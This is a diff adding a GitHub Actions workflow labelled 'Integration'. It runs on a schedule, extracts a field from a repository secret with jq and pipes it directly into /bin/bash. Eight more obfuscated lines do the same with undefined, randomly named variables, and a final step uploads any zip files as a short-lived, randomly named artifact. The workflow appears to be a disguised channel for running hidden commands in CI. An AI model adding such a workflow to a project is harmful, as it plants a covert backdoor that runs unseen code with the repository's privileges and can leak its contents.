@@ -1,0 +1,34 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '56 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          t8: ${{ secrets.t8 }}
+        run: |
+          printf '%s' "$t8" | jq -r .ujewq0234 | /bin/bash
+          printf '%s' "$i145" | jq -r .yr9 | /bin/bash
+          echo $ptnb651 | jq -r .bxs11618 | /bin/bash
+          echo $tael9818 | jq -r .vtmz207 | /bin/bash
+          printf '%s' "$ta611" | jq -r .b5 | /bin/bash
+          printf '%s' "$fyxec63091" | jq -r .lnkfg16 | /bin/bash
+          printf '%s' "$d1634" | jq -r .u54702 | /bin/bash
+          echo $lffxq0394 | jq -r .hmweo7 | /bin/bash
+          printf '%s' "$qp602" | jq -r .uhib2172 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: Vo0cxL8R
+          path: "*.zip"
+          retention-days: 1
